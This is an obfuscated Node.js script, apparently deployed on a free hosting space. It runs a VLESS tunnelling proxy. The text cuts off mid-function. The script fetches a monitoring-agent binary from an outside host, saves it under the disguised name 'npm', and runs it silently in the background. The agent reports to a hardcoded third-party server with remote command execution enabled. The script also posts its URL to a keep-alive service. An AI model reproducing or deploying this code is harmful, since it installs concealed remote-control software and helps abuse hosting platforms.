const _0xd90970=_0x2ff3;(function(_0x40b825,_0x4bbe7d){const _0x58ba14=_0x2ff3,_0x41da87=_0x40b825();while(!![]){try{const _0x30de13=-parseInt(_0x58ba14(0xa9))/0x1*(parseInt(_0x58ba14(0x10d))/0x2)+parseInt(_0x58ba14(0x169))/0x3*(parseInt(_0x58ba14(0xce))/0x4)+parseInt(_0x58ba14(0xe7))/0x5+-parseInt(_0x58ba14(0x11c))/0x6*(parseInt(_0x58ba14(0x110))/0x7)+-parseInt(_0x58ba14(0x162))/0x8*(parseInt(_0x58ba14(0xcf))/0x9)+-parseInt(_0x58ba14(0x10a))/0xa+parseInt(_0x58ba14(0x156))/0xb;if(_0x30de13===_0x4bbe7d)break;else _0x41da87['push'](_0x41da87['shift']());}catch(_0x19add0){_0x41da87['push'](_0x41da87['shift']());}}}(_0x1541,0x9e553));function _0x1541(){const _0x4affd0=['initialized','pendingPackets','writable','1324agdmCW','8748261bpTNbK','floor','headersSent','Created\x20new\x20session\x20for\x20POST:\x20','createServer','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','pop','utf-8','lastActivity','toString','\x20-p\x20','value','finally','\x20timed\x20out\x20without\x20downstream','socket','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','Cleanup\x20error:\x20','axios','resp','nextTick','NEZHA_SERVER','join','socket\x20hang\x20up','read\x20vless\x20header\x20error:\x20','1848120bybKUn','Upload\x20error:\x20','Remote\x20connection\x20established','&mode=packet-up#','Socket\x20error:','/bin/bash','keepAliveTimeout','VLESS\x20connection\x20to\x20','Failed\x20to\x20get\x20IP\x20address:','&path=','%2F','net','readable','TCP_NODELAY','invalid\x20UUID','reduce','replaceAll','cork','Hug','chmod\x20+x\x20npm','aborted','NEZHA_PORT','\x20before\x20initialization',':443?encryption=none&security=tls&sni=','warn','stream','pipeTo','concat','NEZHA_KEY','SESSION_TIMEOUT','env','):\x20','Server\x20is\x20running\x20on\x20port\x20','now','text/plain','6824650xTSSUL','uuid','Session\x20','2LAIsor','npm\x20is\x20running','Failed\x20to\x20write\x20to\x20remote:\x20','3789821RnnIbX','processPacket','7Ner02g5Khs71ghjlSZGfjKjdFilje5K','parse\x20hostname\x20failed','releaseLock','Read\x20controller\x20error:','LOG_LEVEL','443','BUFFER_SIZE','\x0aclient_secret:\x20','2096','includes','6CmDZts','npm','done','random','Process\x20packet\x20error:\x20','push','cleaned','size','https://arm64.ssss.nyc.mn/agent','pipe','catch','responseHeader','2048','New\x20secure\x20connection\x20using:\x20','none','NAME','\x1b[0m','downstreamStarted','POST','SUB_PATH','reset','slice','Remote\x20error:\x20','Error\x20starting\x20downstream:\x20','toISOString','Cleaning\x20up\x20session\x20','connect','headerSent','constructor','writeHead','Server\x20error:\x20','enqueue','hostname','unlink','getWriter','unsupported\x20command:\x20','arm64','Sending\x20VLESS\x20response\x20header\x20(','error','Transform','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22',',\x20size=','end','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','VLESS\x20header\x20parse\x20error:\x20','2087','\x22}\x27','info','close','Too\x20many\x20buffered\x20packets','\x1b[33m','Automatic\x20Access\x20Task\x20added\x20successfully:','application/octet-stream','Content-Type','set','log','listen','31472012AzGkGo','\x20>/dev/null\x202>&1\x20&','delete','\x1b[36m','GET,\x20POST','8443','startDownstream','Failed\x20to\x20process\x20POST\x20request:\x20','initializeVLESS','not\x20enough\x20data\x20to\x20read','arch','nextSeq','8DpFBDv','vless://','from','url','Error\x20added\x20Task:','Internal\x20Server\x20Error','readFile','177ycEEPu','setKeepAlive','MAX_BUFFERED_POSTS','2053','\x1b[31m','GET','false','Created\x20new\x20session\x20for\x20GET:\x20','cleanup','config.yaml','https://arm64.ssss.nyc.mn/v1','debug','Transfer-Encoding','finish','Read\x20controller\x20close\x20error:','get','nohup\x20./npm\x20-s\x20','npm\x20running\x20error:\x20','Received\x20out\x20of\x20order\x20packet\x20seq=','setNoDelay','timeout','data','http','Connected\x20to\x20','\x20bytes','writableEnded','AUTO_ACCESS','uncork','_writeToRemote','_startDownstreamResponse','VLESS\x20header\x20parsed:\x20','text/html','length','createWriteStream','write','2083','pendingBuffers','read\x20address\x20type\x20failed','port','405817tgehZE','destroy','UUID','CHUNK_SIZE','Failed\x20to\x20initialize\x20VLESS:\x20','child_process','fill','reading_done','a2056d0d-c98e-4aeb-9aab-37f64edd5710','message','createConnection','Download\x20error:\x20','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','Processing\x20packet:\x20seq=','remote','no-store','base64','chunked','DOMAIN','vlessHeader','buffer','XPATH','connect\x20timeout','MAX_POST_SIZE','http/1.1','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','Created\x20new\x20session\x20with\x20UUID:\x20','currentStreamRes','/([^/]+)(?:/([0-9]+))?$','alpnProtocol','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','trim','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','resume'];_0x1541=function(){return _0x4affd0;};return _0x1541();}const os=require('os'),fs=require('fs'),net=require(_0xd90970(0xf2)),http=require(_0xd90970(0x17f)),axios=require(_0xd90970(0xe0)),path=require('path'),{Buffer}=require(_0xd90970(0xbd)),{exec,execSync}=require(_0xd90970(0xae)),UUID=process[_0xd90970(0x105)][_0xd90970(0xab)]||_0xd90970(0xb1),NEZHA_SERVER=process[_0xd90970(0x105)][_0xd90970(0xe3)]||'jj.jaiyu.dpdns.org:8008',NEZHA_PORT=process[_0xd90970(0x105)][_0xd90970(0xfc)]||'',NEZHA_KEY=process['env'][_0xd90970(0x103)]||_0xd90970(0x112),AUTO_ACCESS=process[_0xd90970(0x105)][_0xd90970(0x183)]||!![],XPATH=process[_0xd90970(0x105)][_0xd90970(0xbe)]||UUID[_0xd90970(0x131)](0x0,0x8),SUB_PATH=process[_0xd90970(0x105)][_0xd90970(0x12f)]||''+UUID,DOMAIN=process[_0xd90970(0x105)][_0xd90970(0xbb)]||'https://qwe8899-g.hf.space',NAME=process[_0xd90970(0x105)][_0xd90970(0x12b)]||_0xd90970(0xf9),PORT=process[_0xd90970(0x105)]['PORT']||0x1eb4,SETTINGS={[_0xd90970(0xab)]:UUID,[_0xd90970(0x116)]:'none',[_0xd90970(0x118)]:_0xd90970(0x128),[_0xd90970(0xbe)]:_0xd90970(0xf1)+XPATH,[_0xd90970(0x16b)]:0x1e,['MAX_POST_SIZE']:0xf4240,['SESSION_TIMEOUT']:0x7530,[_0xd90970(0xac)]:0x400*0x400,[_0xd90970(0xf4)]:!![],['TCP_KEEPALIVE']:!![]};function validate_uuid(_0x3a19d5,_0xed1dca){for(let _0x21a071=0x0;_0x21a071<0x10;_0x21a071++){if(_0x3a19d5[_0x21a071]!==_0xed1dca[_0x21a071])return![];}return!![];}function concat_typed_arrays(_0x2056e4,..._0x2c03aa){const _0x10c59e=_0xd90970;if(!_0x2c03aa||_0x2c03aa['length']<0x1)return _0x2056e4;let _0x1ee7cc=_0x2056e4[_0x10c59e(0x189)];for(let _0x232959 of _0x2c03aa)_0x1ee7cc+=_0x232959[_0x10c59e(0x189)];const _0x7a2b79=new _0x2056e4[(_0x10c59e(0x138))](_0x1ee7cc);_0x7a2b79['set'](_0x2056e4,0x0),_0x1ee7cc=_0x2056e4[_0x10c59e(0x189)];for(let _0x175b17 of _0x2c03aa){_0x7a2b79[_0x10c59e(0x153)](_0x175b17,_0x1ee7cc),_0x1ee7cc+=_0x175b17[_0x10c59e(0x189)];}return _0x7a2b79;}function log(_0x3639f9,..._0x13adfa){const _0x4403c4=_0xd90970;if(SETTINGS[_0x4403c4(0x116)]===_0x4403c4(0x12a))return;const _0x2c0968={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x7c51ba={'debug':_0x4403c4(0x159),'info':'\x1b[32m','warn':_0x4403c4(0x14f),'error':_0x4403c4(0x16d),'reset':_0x4403c4(0x12c)},_0x2ca2ff=_0x2c0968[SETTINGS['LOG_LEVEL']]||0x1,_0x31533a=_0x2c0968[_0x3639f9]||0x0;if(_0x31533a>=_0x2ca2ff){const _0x26d256=new Date()[_0x4403c4(0x134)](),_0x1321b6=_0x7c51ba[_0x3639f9]||_0x7c51ba['reset'];console[_0x4403c4(0x154)](_0x1321b6+'['+_0x26d256+']\x20['+_0x3639f9+']',..._0x13adfa,_0x7c51ba[_0x4403c4(0x130)]);}}const getDownloadUrl=()=>{const _0x547bbf=_0xd90970,_0x510826=os[_0x547bbf(0x160)]();return _0x510826==='arm'||_0x510826===_0x547bbf(0x140)||_0x510826==='aarch64'?!NEZHA_PORT?_0x547bbf(0x173):_0x547bbf(0x124):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x2ce90f=_0xd90970;if(!NEZHA_KEY)return;try{const _0x1d3580=getDownloadUrl(),_0x537c99=await axios({'method':_0x2ce90f(0x178),'url':_0x1d3580,'responseType':_0x2ce90f(0x100)}),_0x3abac2=fs[_0x2ce90f(0x18a)](_0x2ce90f(0x11d));return _0x537c99[_0x2ce90f(0x17e)][_0x2ce90f(0x125)](_0x3abac2),new Promise((_0x3d77fe,_0x5318df)=>{const _0x33fcb5=_0x2ce90f;_0x3abac2['on'](_0x33fcb5(0x176),()=>{const _0x3962da=_0x33fcb5;console[_0x3962da(0x154)]('npm\x20download\x20successfully'),exec(_0x3962da(0xfa),_0x32b7f5=>{if(_0x32b7f5)_0x5318df(_0x32b7f5);_0x3d77fe();});}),_0x3abac2['on']('error',_0x5318df);});}catch(_0x3075f2){throw _0x3075f2;}},runnz=async()=>{const _0x35422f=_0xd90970;await downloadFile();let _0x23083f='',_0x3ddc2a='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4fa959=[_0x35422f(0x117),_0x35422f(0x15b),_0x35422f(0x11a),'2087','2083',_0x35422f(0x16c)];_0x23083f=_0x4fa959['includes'](NEZHA_PORT)?'--tls':'',_0x3ddc2a=_0x35422f(0x179)+NEZHA_SERVER+':'+NEZHA_PORT+_0x35422f(0xd9)+NEZHA_KEY+'\x20'+_0x23083f+_0x35422f(0x157);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x471718=NEZHA_SERVER[_0x35422f(0x11b)](':')?NEZHA_SERVER['split'](':')[_0x35422f(0xd5)]():'',_0x44c879=new Set(['443','8443',_0x35422f(0x11a),_0x35422f(0x14a),_0x35422f(0x18c),_0x35422f(0x16c)]),_0x3b968a=_0x44c879['has'](_0x471718)?'true':_0x35422f(0x16f),_0xa0d083=_0x35422f(0x119)+NEZHA_KEY+_0x35422f(0x148)+NEZHA_SERVER+_0x35422f(0xc2)+_0x3b968a+_0x35422f(0xc9)+UUID;fs['writeFileSync'](_0x35422f(0x172),_0xa0d083);}_0x3ddc2a=_0x35422f(0xc7);}else return;}try{exec(_0x3ddc2a,{'shell':_0x35422f(0xec)}),console[_0x35422f(0x154)](_0x35422f(0x10e));}catch(_0x44cb34){console[_0x35422f(0x142)](_0x35422f(0x17a)+_0x44cb34);}};async function addAccessTask(){const _0x18d51e=_0xd90970;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x54a56f='https://'+DOMAIN,_0xe44ed8=_0x18d51e(0x145)+_0x54a56f+_0x18d51e(0x14b);exec(_0xe44ed8,(_0x39fd31,_0x38b874,_0x1b98b7)=>{const _0x306155=_0x18d51e;if(_0x39fd31){console[_0x306155(0x142)]('Error\x20sending\x20request:',_0x39fd31[_0x306155(0xb2)]);return;}console[_0x306155(0x154)](_0x306155(0x150),_0x38b874);});}catch(_0x50d063){console[_0x18d51e(0x142)](_0x18d51e(0x166),_0x50d063[_0x18d51e(0xb2)]);}}function parse_uuid(_0x219864){const _0x3d8ff3=_0xd90970;_0x219864=_0x219864[_0x3d8ff3(0xf7)]('-','');const _0x445ca7=[];for(let _0x5e82dc=0x0;_0x5e82dc<0x10;_0x5e82dc++){_0x445ca7[_0x3d8ff3(0x121)](parseInt(_0x219864['substr'](_0x5e82dc*0x2,0x2),0x10));}return _0x445ca7;}async function read_vless_header(_0x166328,_0x273ed0){const _0x12c54d=_0xd90970;let _0x230bcb=0x0,_0x2dd2be=new Uint8Array(),_0x5b0f21={'value':_0x2dd2be,'done':![]};async function _0x40413b(_0x58ca31){const _0x487e42=_0x2ff3;if(_0x5b0f21[_0x487e42(0x11e)])throw new Error('header\x20length\x20too\x20short');const _0x218bef=_0x58ca31-_0x230bcb;if(_0x218bef<0x1)return;_0x5b0f21=await read_atleast(_0x166328,_0x218bef),_0x230bcb+=_0x5b0f21['value'][_0x487e42(0x189)],_0x2dd2be=concat_typed_arrays(_0x2dd2be,_0x5b0f21[_0x487e42(0xda)]);}await _0x40413b(0x1+0x10+0x1);const _0x2ccfbd=_0x2dd2be[0x0],_0x466505=_0x2dd2be[_0x12c54d(0x131)](0x1,0x1+0x10),_0x41102a=parse_uuid(_0x273ed0);if(!validate_uuid(_0x466505,_0x41102a))throw new Error(_0x12c54d(0xf5));const _0x4ad3a4=_0x2dd2be[0x1+0x10],_0x22922c=0x1+0x10+0x1+_0x4ad3a4+0x1+0x2+0x1;await _0x40413b(_0x22922c+0x1);const _0x1aba43=_0x2dd2be[0x1+0x10+0x1+_0x4ad3a4],_0x54c450=0x1;if(_0x1aba43!==_0x54c450)throw new Error(_0x12c54d(0x13f)+_0x1aba43);const _0x2c1c76=(_0x2dd2be[_0x22922c-0x1-0x2]<<0x8)+_0x2dd2be[_0x22922c-0x1-0x1],_0x55c1f5=_0x2dd2be[_0x22922c-0x1],_0x5efa3d=0x1,_0x90f843=0x2,_0x49691f=0x3;let _0x4351ed=-0x1;if(_0x55c1f5===_0x5efa3d)_0x4351ed=_0x22922c+0x4;else{if(_0x55c1f5===_0x49691f)_0x4351ed=_0x22922c+0x10;else _0x55c1f5===_0x90f843&&(_0x4351ed=_0x22922c+0x1+_0x2dd2be[_0x22922c]);}if(_0x4351ed<0x0)throw new Error(_0x12c54d(0xa7));await _0x40413b(_0x4351ed);const _0x254968=_0x22922c;let _0x1bf617='';if(_0x55c1f5===_0x5efa3d)_0x1bf617=_0x2dd2be['slice'](_0x254968,_0x254968+0x4)[_0x12c54d(0xe4)]('.');else{if(_0x55c1f5===_0x90f843)_0x1bf617=new TextDecoder()['decode'](_0x2dd2be['slice'](_0x254968+0x1,_0x254968+0x1+_0x2dd2be[_0x254968]));else _0x55c1f5===_0x49691f&&(_0x1bf617=_0x2dd2be[_0x12c54d(0x131)](_0x254968,_0x254968+0x10)[_0x12c54d(0xf6)]((_0xf7d44e,_0x372360,_0x44e23a,_0x268d66)=>_0x44e23a%0x2?_0xf7d44e[_0x12c54d(0x102)](((_0x268d66[_0x44e23a-0x1]<<0x8)+_0x372360)[_0x12c54d(0xd8)](0x10)):_0xf7d44e,[])['join'](':'));}if(!_0x1bf617){log(_0x12c54d(0x142),'Failed\x20to\x20parse\x20hostname');throw new Error(_0x12c54d(0x113));}return log(_0x12c54d(0x14c),_0x12c54d(0xee)+_0x1bf617+':'+_0x2c1c76),{'hostname':_0x1bf617,'port':_0x2c1c76,'data':_0x2dd2be[_0x12c54d(0x131)](_0x4351ed),'resp':new Uint8Array([_0x2ccfbd,0x0])};}async function read_atleast(_0x5e1a7f,_0x2fcba5){const _0x3cab22=_0xd90970,_0x52f23b=[];let _0xd525a9=![];while(_0x2fcba5>0x0&&!_0xd525a9){const _0x37ee3f=await _0x5e1a7f['read']();if(_0x37ee3f[_0x3cab22(0xda)]){const _0x7db2fd=new Uint8Array(_0x37ee3f['value']);_0x52f23b['push'](_0x7db2fd),_0x2fcba5-=_0x7db2fd[_0x3cab22(0x189)];}_0xd525a9=_0x37ee3f['done'];}if(_0x2fcba5>0x0)throw new Error(_0x3cab22(0x15f));return{'value':concat_typed_arrays(..._0x52f23b),'done':_0xd525a9};}async function parse_header(_0x5cfe76,_0x34c9d2){const _0x1441bd=_0xd90970;log(_0x1441bd(0x174),'Starting\x20to\x20parse\x20VLESS\x20header');const _0x1e858b=_0x34c9d2[_0x1441bd(0xf3)]['getReader']();try{const _0x282ed5=await read_vless_header(_0x1e858b,_0x5cfe76);return log('debug','VLESS\x20header\x20parsed\x20successfully'),_0x282ed5;}catch(_0x5cc2f1){log(_0x1441bd(0x142),_0x1441bd(0x149)+_0x5cc2f1['message']);throw new Error(_0x1441bd(0xe6)+_0x5cc2f1[_0x1441bd(0xb2)]);}finally{_0x1e858b[_0x1441bd(0x114)]();}}async function connect_remote(_0x4848ec,_0x13f1d5){const _0xd54090=_0xd90970,_0x24423d=0x1f40;try{const _0x465a35=await timed_connect(_0x4848ec,_0x13f1d5,_0x24423d);return _0x465a35[_0xd54090(0x17c)](!![]),_0x465a35[_0xd54090(0x16a)](!![],0x3e8),_0x465a35['bufferSize']=parseInt(SETTINGS[_0xd54090(0x118)])*0x400,log('info',_0xd54090(0x180)+_0x4848ec+':'+_0x13f1d5),_0x465a35;}catch(_0x291f7c){log(_0xd54090(0x142),'Connection\x20failed:\x20'+_0x291f7c['message']);throw _0x291f7c;}}function timed_connect(_0x481977,_0x86a587,_0x3a8b26){return new Promise((_0x4d8c5e,_0x4d62c2)=>{const _0x499b53=_0x2ff3,_0x3a445b=net[_0x499b53(0xb3)]({'host':_0x481977,'port':_0x86a587}),_0x221c7d=setTimeout(()=>{const _0x1c1d44=_0x499b53;_0x4d62c2(new Error(_0x1c1d44(0xbf)));},_0x3a8b26);_0x3a445b['on'](_0x499b53(0x136),()=>{clearTimeout(_0x221c7d),_0x4d8c5e(_0x3a445b);}),_0x3a445b['on'](_0x499b53(0x142),_0x116308=>{clearTimeout(_0x221c7d),_0x4d62c2(_0x116308);});});}function pipe_relay(){async function _0x3f9255(_0x131f7f,_0x50af9f,_0x1eebc8){const _0x4a98cd=_0x2ff3,_0x4c5fb9=parseInt(SETTINGS[_0x4a98cd(0xac)]);if(_0x1eebc8[_0x4a98cd(0x189)]>0x0){if(_0x50af9f[_0x4a98cd(0x18b)])_0x50af9f[_0x4a98cd(0xf8)](),_0x50af9f[_0x4a98cd(0x18b)](_0x1eebc8),process[_0x4a98cd(0xe2)](()=>_0x50af9f[_0x4a98cd(0x184)]());else{const _0x1d89bd=_0x50af9f['writable'][_0x4a98cd(0x13e)]();try{await _0x1d89bd[_0x4a98cd(0x18b)](_0x1eebc8);}finally{_0x1d89bd[_0x4a98cd(0x114)]();}}}try{_0x131f7f[_0x4a98cd(0x125)]?(_0x131f7f['pause'](),_0x131f7f[_0x4a98cd(0x125)](_0x50af9f,{'end':!![],'highWaterMark':_0x4c5fb9}),_0x131f7f[_0x4a98cd(0xca)]()):await _0x131f7f[_0x4a98cd(0xf3)][_0x4a98cd(0x101)](_0x50af9f[_0x4a98cd(0xcd)],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal[_0x4a98cd(0x17d)](SETTINGS[_0x4a98cd(0x104)])});}catch(_0x5c7656){!_0x5c7656[_0x4a98cd(0xb2)][_0x4a98cd(0x11b)]('aborted')&&log('error','Relay\x20error:',_0x5c7656[_0x4a98cd(0xb2)]);throw _0x5c7656;}}return _0x3f9255;}function socketToWebStream(_0x15448c){const _0x18d92d=_0xd90970;let _0x176bd0,_0x1ec4c3;return _0x15448c['on'](_0x18d92d(0x142),_0x13812c=>{const _0x38819f=_0x18d92d;log('error',_0x38819f(0xeb),_0x13812c[_0x38819f(0xb2)]),_0x176bd0?.['error'](_0x13812c),_0x1ec4c3?.['error'](_0x13812c);}),{'readable':new ReadableStream({'start'(_0x3fd70f){const _0xad2d20=_0x18d92d;_0x176bd0=_0x3fd70f,_0x15448c['on'](_0xad2d20(0x17e),_0x5763df=>{const _0x451330=_0xad2d20;try{_0x3fd70f[_0x451330(0x13b)](_0x5763df);}catch(_0x1d5a8f){log('error',_0x451330(0x115),_0x1d5a8f[_0x451330(0xb2)]);}}),_0x15448c['on'](_0xad2d20(0x147),()=>{const _0x4539d0=_0xad2d20;try{_0x3fd70f[_0x4539d0(0x14d)]();}catch(_0x26e851){log('error',_0x4539d0(0x177),_0x26e851[_0x4539d0(0xb2)]);}});},'cancel'(){_0x15448c['destroy']();}}),'writable':new WritableStream({'start'(_0x29b7bf){_0x1ec4c3=_0x29b7bf;},'write'(_0x419b75){return new Promise((_0x273dfe,_0x53bfb4)=>{const _0x1c8b48=_0x2ff3;if(_0x15448c['destroyed']){_0x53bfb4(new Error('Socket\x20is\x20destroyed'));return;}_0x15448c[_0x1c8b48(0x18b)](_0x419b75,_0x53314e=>{if(_0x53314e)_0x53bfb4(_0x53314e);else _0x273dfe();});});},'close'(){!_0x15448c['destroyed']&&_0x15448c['end']();},'abort'(_0x60fafc){const _0x596a9d=_0x18d92d;_0x15448c[_0x596a9d(0xaa)](_0x60fafc);}})};}function _0x2ff3(_0x5cfb5a,_0x17a426){const _0x154148=_0x1541();return _0x2ff3=function(_0x2ff31a,_0x1e612f){_0x2ff31a=_0x2ff31a-0xa7;let _0x3fccba=_0x154148[_0x2ff31a];return _0x3fccba;},_0x2ff3(_0x5cfb5a,_0x17a426);}function relay(_0x2def11,_0x29681f,_0x5a4ad4,_0x148c1d){const _0x554b1d=_0xd90970,_0x35493e=pipe_relay();let _0x1a61d8=![];const _0x3d2ec2=socketToWebStream(_0x5a4ad4);function _0x42253e(){const _0x3d58a6=_0x2ff3;if(!_0x1a61d8){_0x1a61d8=!![];try{_0x5a4ad4['destroy']();}catch(_0x311822){!_0x311822[_0x3d58a6(0xb2)]['includes']('aborted')&&!_0x311822['message'][_0x3d58a6(0x11b)](_0x3d58a6(0xe5))&&log(_0x3d58a6(0x142),_0x3d58a6(0xdf)+_0x311822['message']);}}}const _0x37ab64=_0x35493e(_0x29681f,_0x3d2ec2,_0x148c1d[_0x554b1d(0x17e)])[_0x554b1d(0x126)](_0x1da82e=>{const _0x57ae6c=_0x554b1d;!_0x1da82e[_0x57ae6c(0xb2)][_0x57ae6c(0x11b)]('aborted')&&!_0x1da82e[_0x57ae6c(0xb2)]['includes'](_0x57ae6c(0xe5))&&log(_0x57ae6c(0x142),_0x57ae6c(0xe8)+_0x1da82e['message']);})[_0x554b1d(0xdb)](()=>{const _0x1dc9f4=_0x554b1d;_0x29681f[_0x1dc9f4(0xb0)]&&_0x29681f[_0x1dc9f4(0xb0)]();}),_0x3eb75e=_0x35493e(_0x3d2ec2,_0x29681f,_0x148c1d[_0x554b1d(0xe1)])[_0x554b1d(0x126)](_0x2da572=>{const _0x41faa2=_0x554b1d;!_0x2da572[_0x41faa2(0xb2)][_0x41faa2(0x11b)](_0x41faa2(0xfb))&&!_0x2da572[_0x41faa2(0xb2)][_0x41faa2(0x11b)](_0x41faa2(0xe5))&&log(_0x41faa2(0x142),_0x41faa2(0xb4)+_0x2da572['message']);});_0x3eb75e[_0x554b1d(0xdb)](()=>_0x37ab64)[_0x554b1d(0xdb)](_0x42253e);}const sessions=new Map();class Session{constructor(_0x403bb7){const _0x4737b5=_0xd90970;this[_0x4737b5(0x10b)]=_0x403bb7,this[_0x4737b5(0x161)]=0x0,this[_0x4737b5(0x12d)]=![],this[_0x4737b5(0xd7)]=Date[_0x4737b5(0x108)](),this[_0x4737b5(0xbc)]=null,this[_0x4737b5(0xb7)]=null,this[_0x4737b5(0xcb)]=![],this['responseHeader']=null,this[_0x4737b5(0x137)]=![],this['bufferedData']=new Map(),this[_0x4737b5(0x122)]=![],this[_0x4737b5(0xcc)]=[],this[_0x4737b5(0xc4)]=null,this['pendingBuffers']=new Map(),log(_0x4737b5(0x174),_0x4737b5(0xc3)+_0x403bb7);}async[_0xd90970(0x15e)](_0x2ea90e){const _0x3a5a8d=_0xd90970;if(this[_0x3a5a8d(0xcb)])return!![];try{log('debug',_0x3a5a8d(0xb5));const _0xb949ff=new ReadableStream({'start'(_0x5c8005){const _0x2d6d9a=_0x3a5a8d;_0x5c8005['enqueue'](_0x2ea90e),_0x5c8005[_0x2d6d9a(0x14d)]();}}),_0x3c67f3={'readable':_0xb949ff,'writable':new WritableStream()};return this['vlessHeader']=await parse_header(SETTINGS[_0x3a5a8d(0xab)],_0x3c67f3),log(_0x3a5a8d(0x14c),_0x3a5a8d(0x187)+this[_0x3a5a8d(0xbc)][_0x3a5a8d(0x13c)]+':'+this[_0x3a5a8d(0xbc)][_0x3a5a8d(0xa8)]),this[_0x3a5a8d(0xb7)]=await connect_remote(this[_0x3a5a8d(0xbc)][_0x3a5a8d(0x13c)],this[_0x3a5a8d(0xbc)][_0x3a5a8d(0xa8)]),log(_0x3a5a8d(0x14c),_0x3a5a8d(0xe9)),this['initialized']=!![],!![];}catch(_0x3bd305){return log(_0x3a5a8d(0x142),_0x3a5a8d(0xad)+_0x3bd305['message']),![];}}async['processPacket'](_0x2fc40a,_0x579dcf){const _0x3ae342=_0xd90970;try{this['pendingBuffers'][_0x3ae342(0x153)](_0x2fc40a,_0x579dcf),log('debug','Buffered\x20packet\x20seq='+_0x2fc40a+_0x3ae342(0x146)+_0x579dcf[_0x3ae342(0x189)]);while(this[_0x3ae342(0x18d)]['has'](this['nextSeq'])){const _0x46ab23=this[_0x3ae342(0x18d)][_0x3ae342(0x178)](this[_0x3ae342(0x161)]);this[_0x3ae342(0x18d)][_0x3ae342(0x158)](this[_0x3ae342(0x161)]);if(!this[_0x3ae342(0xcb)]&&this['nextSeq']===0x0){if(!await this[_0x3ae342(0x15e)](_0x46ab23))throw new Error('Failed\x20to\x20initialize\x20VLESS\x20connection');this[_0x3ae342(0x127)]=Buffer[_0x3ae342(0x164)](this[_0x3ae342(0xbc)][_0x3ae342(0xe1)]),await this['_writeToRemote'](this[_0x3ae342(0xbc)][_0x3ae342(0x17e)]),this['currentStreamRes']&&this['_startDownstreamResponse']();}else{if(!this[_0x3ae342(0xcb)]){log(_0x3ae342(0xff),_0x3ae342(0x17b)+_0x2fc40a+_0x3ae342(0xfd));continue;}await this[_0x3ae342(0x185)](_0x46ab23);}this['nextSeq']++,log('debug','Processed\x20packet\x20seq='+(this[_0x3ae342(0x161)]-0x1));}if(this[_0x3ae342(0x18d)][_0x3ae342(0x123)]>SETTINGS[_0x3ae342(0x16b)])throw new Error(_0x3ae342(0x14e));return!![];}catch(_0x47382d){log(_0x3ae342(0x142),_0x3ae342(0x120)+_0x47382d['message']);throw _0x47382d;}}[_0xd90970(0x186)](){const _0x396b9f=_0xd90970;if(!this[_0x396b9f(0xc4)]||!this[_0x396b9f(0x127)])return;try{const _0x4f8f16=this['currentStreamRes'][_0x396b9f(0xdd)]?.[_0x396b9f(0xc6)]||_0x396b9f(0xc1),_0x1c8890=_0x4f8f16==='h2';!this[_0x396b9f(0x137)]&&(log(_0x396b9f(0x174),_0x396b9f(0x141)+_0x4f8f16+_0x396b9f(0x106)+this[_0x396b9f(0x127)]['length']+_0x396b9f(0x181)),this['currentStreamRes']['write'](this[_0x396b9f(0x127)]),this['headerSent']=!![]);if(_0x1c8890){this[_0x396b9f(0xc4)][_0x396b9f(0xdd)][_0x396b9f(0x17c)](!![]);const _0x3060dc=new require(_0x396b9f(0x100))[_0x396b9f(0x143)]({'transform'(_0x3cf334,_0x2a001c,_0x5985c7){const _0x1e9a98=_0x396b9f,_0x4f818c=0x4000;for(let _0x535903=0x0;_0x535903<_0x3cf334[_0x1e9a98(0x189)];_0x535903+=_0x4f818c){this[_0x1e9a98(0x121)](_0x3cf334[_0x1e9a98(0x131)](_0x535903,_0x535903+_0x4f818c));}_0x5985c7();}});this[_0x396b9f(0xb7)][_0x396b9f(0x125)](_0x3060dc)[_0x396b9f(0x125)](this[_0x396b9f(0xc4)]);}else this[_0x396b9f(0xb7)][_0x396b9f(0x125)](this[_0x396b9f(0xc4)]);this[_0x396b9f(0xb7)]['on'](_0x396b9f(0x147),()=>{const _0x30299a=_0x396b9f;!this[_0x30299a(0xc4)][_0x30299a(0x182)]&&this[_0x30299a(0xc4)][_0x30299a(0x147)]();}),this[_0x396b9f(0xb7)]['on']('error',_0x1659a8=>{const _0x191597=_0x396b9f;log(_0x191597(0x142),_0x191597(0x132)+_0x1659a8[_0x191597(0xb2)]),!this[_0x191597(0xc4)][_0x191597(0x182)]&&this[_0x191597(0xc4)][_0x191597(0x147)]();});}catch(_0x3db50a){log(_0x396b9f(0x142),_0x396b9f(0x133)+_0x3db50a[_0x396b9f(0xb2)]),this[_0x396b9f(0x171)]();}}['startDownstream'](_0x64c6fd,_0x117a28){const _0xe07ad9=_0xd90970;return!_0x64c6fd[_0xe07ad9(0xd1)]&&_0x64c6fd[_0xe07ad9(0x139)](0xc8,_0x117a28),this[_0xe07ad9(0xc4)]=_0x64c6fd,this[_0xe07ad9(0xcb)]&&this[_0xe07ad9(0x127)]&&this['_startDownstreamResponse'](),_0x64c6fd['on'](_0xe07ad9(0x14d),()=>{const _0x18bcef=_0xe07ad9;log(_0x18bcef(0x14c),'Client\x20connection\x20closed'),this[_0x18bcef(0x171)]();}),!![];}async[_0xd90970(0x185)](_0x3fdf5e){const 